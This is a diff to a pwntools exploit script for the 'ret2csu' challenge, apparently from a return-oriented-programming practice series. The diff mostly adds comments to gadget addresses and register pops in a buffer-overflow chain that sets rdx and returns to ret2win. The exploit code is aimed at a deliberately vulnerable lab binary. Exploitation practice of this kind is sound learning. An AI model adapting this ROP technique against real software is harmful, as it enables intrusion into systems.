@@ -6,8 +6,8 @@ t = pwn.process("./ret2csu")
 pwn.gdb.attach(t)
 
 
-ret2win = 0x4007b1
-initAddr= 0x600e38
+ret2win = 0x4007b1      #address of ret2win
+initAddr= 0x600e38      #address that points to _init's address
 popRdi =  0x4008a3      #pop rdi; ret;
 UropGadget1 = 0x40089a #pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
 UropGadget2 = 0x400880 #mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword PTR [r12+rbx*8];
@@ -18,12 +18,12 @@ buf = 'h'*40
 
 #UropGadget1
 buf += pwn.p64(UropGadget1)
-buf += pwn.p64(7) #rbx
-buf += pwn.p64(8) #rbp
-buf += pwn.p64(0x600e00) #r12
-buf += 'junk0000' #r13
-buf += 'junk0001' #r14
-buf += pwn.p64(0xdeadcafebabebeef) # r15
+buf += pwn.p64(7)                   #pop rbx
+buf += pwn.p64(8)                   #pop rbp
+buf += pwn.p64(0x600e00)            #pop r12
+buf += 'junk0000'                   #pop r13
+buf += 'junk0001'                   #pop r14
+buf += pwn.p64(0xdeadcafebabebeef)  #pop r15
 
 
 #using UropGadget2, sets rdx to correct value and eventually returns to ret2win
